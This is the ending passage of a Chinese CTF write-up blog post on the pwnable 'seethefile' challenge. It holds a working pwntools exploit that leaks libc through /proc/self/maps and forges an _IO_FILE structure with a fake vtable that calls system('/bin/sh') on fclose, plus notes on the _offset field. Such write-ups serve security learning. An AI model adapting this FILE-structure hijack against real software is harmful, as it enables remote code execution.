<h2 id="补充后来复现在这个题的时候发现通过上面的伪造方式是无法实现vtable指针的改写是因为数据过长后到了bss下面的区域这块区域会将数据清空而且我们在改的过程中还有一个值得注意的地方就是io_file-里面-的_offset变量一定要是我们fp指针的4偏移"><a class="markdownIt-Anchor" href="#补充后来复现在这个题的时候发现通过上面的伪造方式是无法实现vtable指针的改写是因为数据过长后到了bss下面的区域这块区域会将数据清空而且我们在改的过程中还有一个值得注意的地方就是io_file-里面-的_offset变量一定要是我们fp指针的4偏移">#</a> 补充，后来复现在这个题的时候，发现通过上面的伪造方式，是无法实现 vtable 指针的改写，是因为数据过长后，到了 bss 下面的区域，这块区域会将数据清空，而且我们在改的过程中，还有一个值得注意的地方，就是 io_file 里面 的_offset 变量，一定要是我们 fp 指针的 + 4 偏移</h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r=process(<span class="string">&#x27;./seethefile&#x27;</span>)</span><br><span class="line">elf =ELF(<span class="string">&quot;./seethefile&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">name = <span class="number">0x804B260</span></span><br><span class="line">fp = <span class="number">0x804B280</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ch</span>(<span class="params">i</span>):</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;Your choice :&quot;</span> ,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">open_file</span>(<span class="params">file_path</span>):</span><br><span class="line">	ch(<span class="number">1</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;What do you want to see :&quot;</span>,file_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">open_file(<span class="string">&quot;/proc/self/maps&quot;</span>)</span><br><span class="line">ch(<span class="number">2</span>)</span><br><span class="line">ch(<span class="number">3</span>)</span><br><span class="line">ch(<span class="number">2</span>)</span><br><span class="line">ch(<span class="number">3</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;[heap]\n&quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(<span class="string">b&quot;0x&quot;</span>+r.recv(<span class="number">8</span>),<span class="number">16</span>)+<span class="number">0x1000</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>] + libc_base</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system : &quot;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line">payload = <span class="string">b&#x27;\x01\xA0;/bin/sh\x00\x00&#x27;</span>+p32(system_addr)+p32(<span class="number">0</span>)*<span class="number">4</span>+p32(name)</span><br><span class="line">payload +=p32(<span class="number">0xcafebabe</span>)*<span class="number">5</span> + p32(<span class="number">0xffffffff</span>) + p32(<span class="number">0xcafebabe</span>)*<span class="number">4</span> +p32(name+<span class="number">4</span>)</span><br><span class="line">payload =payload.ljust(<span class="number">0x94</span>,<span class="string">b&#x27;a&#x27;</span>)+p32(<span class="number">0x0804b264</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(r,<span class="string">&#x27;b *0x08048AF5&#x27;</span>)</span><br><span class="line">ch(<span class="number">5</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Leave your name :&quot;</span>,payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>总结：这个文章内容比较多，但是重点就在与 io_file_plus 以及虚表的使用，有时候较低的版本可以不去伪造 vtable, 而时可以直接修改 vtable 的数据，但是当下的新版本不在可以。对于不同的函数有不同的利用姿势。、</p>

      <div class="tags">
          <a href="/tags/writeup/" rel="tag"><i class="ic i-tag"></i> writeup</a>
      </div>
  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">Edited on</span>
    <time title="Modified: 2022-03-22 15:42:39" itemprop="dateModified" datetime="2022-03-22T15:42:39+08:00">2022-03-22</time>
  </span>
</div>

      
<div class="reward">
  <button><i class="ic i-heartbeat"></i> Donate</button>
  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
  <div id="qr">
      
      <div>
        <img data-src="/images/wechatpay.png" alt="dreamcat WeChat Pay">
        <p>WeChat Pay</p>
      </div>
      
      <div>
        <img data-src="/images/alipay.png" alt="dreamcat Alipay">
        <p>Alipay</p>
      </div>
      
      <div>
        <img data-src="/images/paypal.png" alt="dreamcat PayPal">
        <p>PayPal</p>
      </div>
  </div>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>Post author:  </strong>dreamcat <i class="ic i-at"><em>@</em></i>我他喵的
  </li>
  <li class="link">
    <strong>Post link: </strong>
    <a href="http://example.com/2022/03/19/pwnable-seethefile/" title="pwnable_seethefile">http://example.com/2022/03/19/pwnable-seethefile/</a>
  </li>
  <li class="license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/2021/03/19/hello-world/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva4.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gicli3sbvtj20zk0m8x6p.jpg" title="Hello World">
  <span class="type">Previous Post</span>
  <span class="category"><i class="ic i-flag"></i> begin</span>
  <h3>Hello World</h3>
  </a>

    </div>
    <div class="item right">
      

  <a href="/2022/03/20/buuoj-heapcreator/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva4.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giciryrr3rj20zk0m8nhk.jpg" title="buuoj_heapcreator">
  <span class="type">Next Post</span>
  <span class="category"><i class="ic i-flag"></i> pwn</span>
  <h3>buuoj_heapcreator</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="Contents">
          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#question"><span class="toc-number">1.</span> <span class="toc-text"> question</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90__io_file_plusneide%E4%B8%80%E4%BA%9B%E5%86%85%E5%AE%B9"><span class="toc-number">2.</span> <span class="toc-text"> 分析 ——__IO_FILE_plusneide 一些内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9E%E5%BD%92%E9%A2%98%E7%9B%AE%E6%80%9D%E8%B7%AF%E6%98%8E%E7%A1%AE%E6%BA%A2%E5%87%BA%E4%BF%AE%E6%94%B9fd%E7%9A%84plus%E8%B0%83%E7%94%A8close%E6%97%B6%E8%B0%83%E7%94%A8system"><span class="toc-number">3.</span> <span class="toc-text"> 回归题目，思路明确，溢出修改 fd 的 plus，调用 close 时调用 system，</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E5%85%85%E5%90%8E%E6%9D%A5%E5%A4%8D%E7%8E%B0%E5%9C%A8%E8%BF%99%E4%B8%AA%E9%A2%98%E7%9A%84%E6%97%B6%E5%80%99%E5%8F%91%E7%8E%B0%E9%80%9A%E8%BF%87%E4%B8%8A%E9%9D%A2%E7%9A%84%E4%BC%AA%E9%80%A0%E6%96%B9%E5%BC%8F%E6%98%AF%E6%97%A0%E6%B3%95%E5%AE%9E%E7%8E%B0vtable%E6%8C%87%E9%92%88%E7%9A%84%E6%94%B9%E5%86%99%E6%98%AF%E5%9B%A0%E4%B8%BA%E6%95%B0%E6%8D%AE%E8%BF%87%E9%95%BF%E5%90%8E%E5%88%B0%E4%BA%86bss%E4%B8%8B%E9%9D%A2%E7%9A%84%E5%8C%BA%E5%9F%9F%E8%BF%99%E5%9D%97%E5%8C%BA%E5%9F%9F%E4%BC%9A%E5%B0%86%E6%95%B0%E6%8D%AE%E6%B8%85%E7%A9%BA%E8%80%8C%E4%B8%94%E6%88%91%E4%BB%AC%E5%9C%A8%E6%94%B9%E7%9A%84%E8%BF%87%E7%A8%8B%E4%B8%AD%E8%BF%98%E6%9C%89%E4%B8%80%E4%B8%AA%E5%80%BC%E5%BE%97%E6%B3%A8%E6%84%8F%E7%9A%84%E5%9C%B0%E6%96%B9%E5%B0%B1%E6%98%AFio_file-%E9%87%8C%E9%9D%A2-%E7%9A%84_offset%E5%8F%98%E9%87%8F%E4%B8%80%E5%AE%9A%E8%A6%81%E6%98%AF%E6%88%91%E4%BB%ACfp%E6%8C%87%E9%92%88%E7%9A%844%E5%81%8F%E7%A7%BB"><span class="toc-number"></span> <span class="toc-text"> 补充，后来复现在这个题的时候，发现通过上面的伪造方式，是无法实现 vtable 指针的改写，是因为数据过长后，到了 bss 下面的区域，这块区域会将数据清空，而且我们在改的过程中，还有一个值得注意的地方，就是 io_file 里面 的_offset 变量，一定要是我们 fp 指针的 + 4 偏移</span></a>
      </div>
      <div class="related panel pjax" data-title="Related">
        <ul>
          <li class="active"><a href="/2022/03/19/pwnable-seethefile/" rel="bookmark" title="pwnable_seethefile">pwnable_seethefile</a></li><li><a href="/2022/03/20/buuoj-heapcreator/" rel="bookmark" title="buuoj_heapcreator">buuoj_heapcreator</a></li><li><a href="/2022/03/21/roarctf-2019-easypwn/" rel="bookmark" title="roarctf_2019_easypwn">roarctf_2019_easypwn</a></li><li><a href="/2022/03/22/tw2017parrot/" rel="bookmark" title="tw2017parrot">tw2017parrot</a></li><li><a href="/2022/04/01/note-file/" rel="bookmark" title="note_file">note_file</a></li><li><a href="/2022/04/01/tcache-tear/" rel="bookmark" title="tcache_tear">tcache_tear</a></li><li><a href="/2022/04/10/pwnable-bookwriter/" rel="bookmark" title=""></a></li><li><a href="/2022/04/14/heap-paradise/" rel="bookmark" title="heap_paradise">heap_paradise</a></li><li><a href="/2022/04/18/starctf_examination/" rel="bookmark" title="examination">examination</a></li><li><a href="/2022/04/19/starctf-babynote/" rel="bookmark" title="starctf_babynote">starctf_babynote</a></li><li><a href="/2022/04/25/MRCTF-ezbash/" rel="bookmark" title="MRCTF_ezbash">MRCTF_ezbash</a></li><li><a href="/2022/05/10/chunzhiIOT/" rel="bookmark" title="chunzhiIOT">chunzhiIOT</a></li><li><a href="/2022/05/10/torghast/" rel="bookmark" title="torghast">torghast</a></li><li><a href="/2022/05/13/pwnable-re-alloc/" rel="bookmark" title="pwnable-re-alloc">pwnable-re-alloc</a></li><li><a href="/2022/06/18/ciscn2022-syscall/" rel="bookmark" title="ciscn2022_syscall">ciscn2022_syscall</a></li><li><a href="/2022/06/19/ciscn-2022-popcalc/" rel="bookmark" title="ciscn_2022_popcalc">ciscn_2022_popcalc</a></li><li><a href="/2022/06/20/ciscn-2022-planecoode/" rel="bookmark" title="ciscn_2022_planecoode">ciscn_2022_planecoode</a></li><li><a href="/2022/09/20/tctf2022ezvm/" rel="bookmark" title="tctf2022ezvm">tctf2022ezvm</a></li>
        </ul>
      </div>
      <div class="overview panel" data-title="Overview">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt="dreamcat"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">dreamcat</p>
  <div class="description" itemprop="description"></div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">33</span>
        <span class="name">posts</span>
      </a>
    </div>
    <div class="item categories">
      <a href="/categories/">
        <span class="count">4</span>
        <span class="name">categories</span>
      </a>
    </div>
    <div class="item tags">
      <a href="/tags/">
        <span class="count">8</span>
        <span class="name">tags</span>
      </a>
    </div>
</nav>

<div class="social">
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
  </li>


</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
        <a href="/2021/03/19/hello-world/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
        <a href="/2022/03/20/buuoj-heapcreator/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div class="rpost pjax">
  <h2>Random Posts</h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/pwn/" title="In pwn">pwn</a>
</div>

    <span><a href="/2022/04/01/note-file/" title="note_file">note_file</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/pwn/" title="In pwn">pwn</a>
</div>

    <span><a href="/2022/04/25/MRCTF-ezbash/" title="MRCTF_ezbash">MRCTF_ezbash</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/kernel/" title="In kernel">kernel</a>
</div>

    <span><a href="/2022/05/03/inctf2021-kqueue/" title="inctf2021_kqueue">inctf2021_kqueue</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/pwn/" title="In pwn">pwn</a>
</div>

    <span><a href="/2022/03/19/pwnable-seethefile/" title="pwnable_seethefile">pwnable_seethefile</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/pwn/" title="In pwn">pwn</a>
</div>

    <span><a href="/2022/06/18/ciscn2022-syscall/" title="ciscn2022_syscall">ciscn2022_syscall</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/pwn/" title="In pwn">pwn</a>
</div>

    <span><a href="/2022/04/14/heap-paradise/" title="heap_paradise">heap_paradise</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/pwn/" title="In pwn">pwn</a>
</div>

    <span><a href="/2022/05/13/pwnable-re-alloc/" title="pwnable-re-alloc">pwnable-re-alloc</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2022/05/12/%E9%80%86%E5%90%91%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/" title="逆向常见算法">逆向常见算法</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/pwn/" title="In pwn">pwn</a>
</div>

    <span><a href="/2022/04/18/starctf_examination/" title="examination">examination</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/pwn/" title="In pwn">pwn</a>
</div>

    <span><a href="/2022/05/10/chunzhiIOT/" title="chunzhiIOT">chunzhiIOT</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>Recent Comments</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2010 – 
    <span itemprop="copyrightYear">2022</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">dreamcat @ dreamcat</span>
  </div>
  <div class="count">
    <span class="post-meta-item-icon">
      <i class="ic i-chart-area"></i>
    </span>
    <span title="Symbols count total">282k words</span>

    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="ic i-coffee"></i>
    </span>
    <span title="Reading time total">4:16</span>
  </div>
  <div class="powered-by">
    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: '2022/03/19/pwnable-seethefile/',
    favicon: {
      show: "（●´3｀●）Goooood",
      hide: "(´Д｀)dreamcat?"
    },
    search : {
      placeholder: "Search for Posts",
      empty: "We didn't find any results for the search: ${query}",
      stats: "${hits} results found in ${time} ms"
    },
    valine: true,fancybox: true,
    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




</body>
</html>
